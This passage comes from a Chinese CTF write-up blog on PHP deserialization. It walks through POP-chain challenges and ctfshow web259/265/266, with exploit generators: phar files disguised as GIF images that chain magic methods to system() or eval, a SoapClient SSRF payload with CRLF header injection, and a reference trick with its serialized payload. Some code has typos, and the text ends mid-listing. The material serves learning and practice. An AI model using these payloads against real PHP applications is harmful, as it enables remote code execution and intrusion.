class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 请在下方编写你的生成代码 (exp.php) ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 提示（倒推思路）：</span></span><br><span class="line"><span class="comment"> * 1. 终点：Sink 类的 execute() 需要被执行。</span></span><br><span class="line"><span class="comment"> * 2. 谁能调 execute()？HardGet 的 __get。</span></span><br><span class="line"><span class="comment"> * 3. 谁能触发 __get？MediumJump 的 __toString 访问了一个不存在的 &#x27;secret&#x27;。</span></span><br><span class="line"><span class="comment"> * 4. 谁能触发 __toString？EasyStart 的 __destruct 执行了 echo。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>继续审计X_X➡</strong></p>
+<p>四个类：EasyStart、MediumJump、HardGet、Sink</p>
+<p>EasyStart类，看到<code>__destruct()</code>函数，作为<strong>POP链起点</strong></p>
+<p>要执行的<code>system(&#39;whoami&#39;)</code>出现在Sink类里，Sink作为<strong>链条终点</strong></p>
+<p>依旧将**$var变量设为MediumJump类的对象**，触发toString()</p>
+<p>然后将$b设为HardGet的对象，因为HardGet里面根本没有$secret这个属性，<strong>所以会触发__get()</strong>，访问了$name这个变量。</p>
+<p>所以我们再将$c这个变量设为Sink的对象，就把火引导了Sink里，最终执行whoami</p>
+<p>接下来写代码➡</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 挑战 02：四阶链条突破</span></span><br><span class="line"><span class="comment"> * 目标：执行 system(&quot;whoami&quot;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 目标代码 (source.php) ---</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EasyStart</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[1] 启动 EasyStart...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// 这里的 echo 是为了触发下一个类的 __toString</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MediumJump</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[2] 进入 MediumJump...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// 关键点：尝试访问 $b 里的 &#x27;secret&#x27; 属性</span></span><br><span class="line">        <span class="comment">// 如果 $b 对应的类里没有 &#x27;secret&#x27;，就会去敲 __get 的门</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;b-&gt;secret; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HardGet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当访问不存在的属性时触发，$name 会被赋值为 &quot;secret&quot;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[3] 触发了 HardGet 的 __get，访问了不存在的属性：&quot;</span> . <span class="variable">$name</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// 这里的 $this-&gt;c 才是我们要套娃的地方</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[4] 最终终点站！执行命令...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">HardGet</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;c = <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title class_">MediumJump</span>();</span><br><span class="line"><span class="variable">$m</span>-&gt;b = <span class="variable">$h</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title class_">EasyStart</span>();</span><br><span class="line"><span class="variable">$e</span>-&gt;a = <span class="variable">$m</span>;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;exp.phar&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;exp.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exp2.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetaData</span>(<span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;exp2.phar&quot;</span>,<span class="string">&quot;exp2.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-0喵喵"><a href="#3-0喵喵" class="headerlink" title="3.0喵喵"></a>3.0喵喵</h3><p>题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserProfile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logger</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 触发点 1：访问不存在的属性</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username-&gt;vipStatus) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;欢迎 VIP 用户&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handler</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$prop</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;正在记录日志...属性名: &quot;</span> . <span class="variable">$prop</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// 触发点 2：把对象当成函数调用</span></span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;handler;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Executor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;执行动态脚本...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 漏洞触发口</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="comment">// 模拟上传后的文件检查</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$path</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php/i&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">is_file</span>(<span class="variable">$path</span>); <span class="comment">// 这里会触发 Phar 反序列化吗？</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>审计POP➡<del>（微丝）</del></p>
+<p>类<code>UserProfile</code>为起点，<code>Executor</code>为终点执行<code>eval</code>函数，<code>Logger</code>为中间踏板</p>
+<p>通过触发<code>__get</code>函数达到触发<code>Executor</code>中<code>__invoke</code>来执行eval的目的</p>
+<p>因此考虑将<code>Executor</code>对象设为<code>Logger</code>的<code>$this-&gt;handler</code></p>
+<p>再将<code>Logger</code> 对象设为<code>$this-&gt;username</code>即可触发这段链条</p>
+<p>再因为没有<code>unserialize()</code>，考虑phar反序列化</p>
+<p>编写➡</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserProfile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logger</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handler</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Execytor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exe</span> = <span class="keyword">new</span> <span class="title class_">Execytor</span>();</span><br><span class="line"><span class="variable">$exe</span>-&gt;code = <span class="string">&quot;sysytem(&#x27;whoami&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>();</span><br><span class="line"><span class="variable">$log</span>-&gt;handler = <span class="variable">$exe</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">UserProfile</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;username = <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;avatar.phar&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;avatar.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$puhar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;avatar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetaData</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;avatar.phar&quot;</span>, <span class="string">&quot;avatar.jpg&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>🤔，换汤不换药了说是……</p>
+<hr>
+<p>本来是想找phar反序列化的题做做来着，也是没找到……😓，所以去做反序列化的题目了</p>
+<h3 id="4-0-ctfshow-web259"><a href="#4-0-ctfshow-web259" class="headerlink" title="4.0 ctfshow-web259"></a>4.0 ctfshow-web259</h3><p>题目：</p>
+<img src="/2026/02/28/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/1.png" class="" title="图片正常显示了喵~">
+
+<p>and</p>
+<img src="/2026/02/28/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/2.png" class="" title="图片正常显示了喵~">
+
+<p><strong>依旧审计ing➡</strong></p>
+<p><strong>先看index.php：</strong></p>
+<p>直接对<code>$vip</code>变量进行反序列化，然后执行<code>$vip-&gt;getFlag()</code>，但是根本没有看到这个方法，</p>
+<p>所以要<strong>去考虑PHP内置的类</strong>，即<code>SoapClient</code>，因为<code>SoapClient</code>里有一个函数叫<code>__call</code>，当调用类里不存在的方法就会触发</p>
+<p>然后<code>__call</code>就会发送HTTP POST请求到指定的<code>location</code>（<strong>SSRF</strong>）</p>
+<p><strong>再看flag.php：</strong></p>
+<p>首先检查了<code>X-Forwarded-For</code></p>
+<p>然后需要POST <code>token=ctfshow</code></p>
+<p><strong>我们来编写一下代码➡</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1, 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&quot;token=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$user_agent</span> = <span class="string">&quot;ctfshow\r\n&quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="variable">$headers</span>) . <span class="string">&quot;\r\nContent-Length: &quot;</span> . <span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>) . <span class="string">&quot;\r\n\r\n&quot;</span> . <span class="variable">$post_data</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$user_agent</span></span><br><span class="line">));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>好吧，做一半寄了，没学会SSRF，太坏了，这道题回头学完了SSRF补上X_X</p>
+<h3 id="5-0-cttfshow-web265"><a href="#5-0-cttfshow-web265" class="headerlink" title="5.0 cttfshow-web265"></a>5.0 cttfshow-web265</h3><p>题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>审计一下➡</p>
+<p>存在一个类：ctfshowAdmimn</p>
+<p>要得到flag，就要使得<code>$ctfshow-&gt;login()</code>结果为True，即$token和$password强等于</p>
+<p>从 URL 的 GET 参数 <code>ctfshow</code> 中读取字符串，并通过反序列化将其还原成一个 <code>ctfshowAdmin</code> 对象，但是存在<code>$ctfshow-&gt;token=md5(mt_rand());</code>使得<code>$token</code>完全随机</p>
+<p>思路➡</p>
+<p>考虑<strong>PHP引用</strong>，如果<code>$password</code>不是<code>$token</code>的副本，而是<code>$token</code>的<strong>引用（&amp;）</strong>，那么<code>$password</code>和<code>$token</code>绑定，<strong>MD5值相同</strong></p>
+<p>编写代码➡</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;password = &amp;<span class="variable">$exp</span>-&gt;token;</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>序列化得到<code>O%3A12%3A%22ctfshowAdmin%22%3A2%3A%7Bs%3A5%3A%22token%22%3BN%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D</code></p>
+<p>然后GET传参得到flag</p>
+<img src="/2026/02/28/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/3.png" class="" title="图片正常显示了喵~">
+
+<h3 id="6-0-ctfshow-web266"><a href="#6-0-ctfshow-web266" class="headerlink" title="6.0 ctfshow-web266"></a>6.0 ctfshow-web266</h3><p>题目:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span 